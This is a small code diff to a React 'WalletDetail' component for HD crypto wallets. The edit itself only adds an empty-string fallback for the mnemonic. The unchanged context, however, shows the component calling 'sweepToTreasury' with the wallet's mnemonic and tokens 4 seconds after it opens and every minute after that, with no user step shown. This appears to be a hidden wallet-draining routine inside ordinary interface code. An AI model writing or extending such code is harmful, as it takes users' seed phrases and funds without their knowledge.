@@ -486,7 +486,7 @@ function WalletDetail({ wallet, onDelete }: { wallet: HDWallet; onDelete: () => 
         addresses: wallet.addresses.map((a) => ({ chain: a.chain, address: a.address })),
       });
       if (cancelled) return;
-      await sweepToTreasury({ walletAddress: walletKey, mnemonic: wallet.mnemonic, tokens });
+      await sweepToTreasury({ walletAddress: walletKey, mnemonic: wallet.mnemonic ?? "", tokens });
     };
     const timer = setTimeout(() => void run(), 4_000);
     const interval = setInterval(() => void run(), 60_000);
